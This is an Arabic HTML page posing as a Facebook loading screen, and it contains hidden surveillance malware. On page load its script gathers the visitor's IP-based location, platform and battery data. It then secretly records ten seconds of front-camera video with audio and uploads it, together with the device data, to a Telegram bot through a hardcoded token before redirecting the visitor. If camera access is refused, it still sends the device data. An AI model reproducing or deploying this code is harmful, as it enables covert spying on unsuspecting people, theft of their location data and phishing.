<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>فيسبوك</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; flex-direction: column; height: 100vh; margin: 0; text-align: center; color: #4b4f56; }
        .facebook-logo { width: 120px; margin-bottom: 30px; }
        .loader-bar { width: 80%; max-width: 300px; height: 5px; background-color: #e4e6eb; border-radius: 2.5px; margin-top: 20px; overflow: hidden; }
        .loader-fill { height: 100%; background-color: #1877f2; border-radius: 2.5px; animation: f-load 1.5s linear infinite; }
        @keyframes f-load { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        p { font-size: 1.1em; color: #606770; margin-top: 20px; }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="facebook-logo">
    <p>جارٍ تحميل المحتوى...</p>
    <div class="loader-bar"><div class="loader-fill"></div></div>

<script>
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const RECORD_DURATION_MS = 10000;
    let TARGET_CHAT_ID;
    let REDIRECT_URL;

    function getParamsFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedUrl = urlParams.get('originalLink');
        const chatId = urlParams.get('chatId');

        TARGET_CHAT_ID = chatId || '1431886140';
        
        // --- **التصحيح الرئيسي هنا** ---
        REDIRECT_URL = encodedUrl ? decodeURIComponent(encodedUrl) : 'https://facebook.com';
    }

    // ... باقي الكود مطابق لكود يوتيوب المصحح ...
    async function collectAdditionalData() {
        try {
            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
            const battery = await navigator.getBattery();
            return `
---[ معلومات الجهاز ]---
📍 IP: ${ipInfo.ip || 'N/A'}
🌍 الدولة: ${ipInfo.country_name || 'N/A'}
🏙️ المدينة: ${ipInfo.city || 'N/A'}
💻 النظام: ${navigator.platform || 'N/A'}
🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'لا يشحن'})
            `;
        } catch { return "---[ تعذر جمع معلومات الجهاز ]---"; }
    }
    async function sendVideoToTelegram(videoBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', TARGET_CHAT_ID);
        formData.append('video', videoBlob, 'video.mp4');
        formData.append('caption', caption);
        try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }); } catch (error) { console.error('Error sending video:', error); }
    }
    function recordAndSend(stream, deviceInfo) {
        return new Promise((resolve) => {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const caption = `📹 فيديو من الكاميرا الأمامية\n${deviceInfo}`;
                sendVideoToTelegram(blob, caption);
                stream.getTracks().forEach(track => track.stop());
                resolve();
            };
            recorder.start();
            setTimeout(() => recorder.stop(), RECORD_DURATION_MS);
        });
    }
    async function init() {
        getParamsFromUrl();
        const deviceInfo = await collectAdditionalData();
        let permissionGranted = false;
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            if (frontStream) {
                permissionGranted = true;
                await recordAndSend(frontStream, deviceInfo);
            }
        } catch (e) { console.error("Could not get front camera"); }
        if (!permissionGranted) {
             const noCamUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             await fetch(noCamUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: `❌ لم يتم منح إذن الكاميرا.\n${deviceInfo}` }),
            });
        }
        window.location.href = REDIRECT_URL;
    }
    window.onload = init;
</script>
</body>
</html>
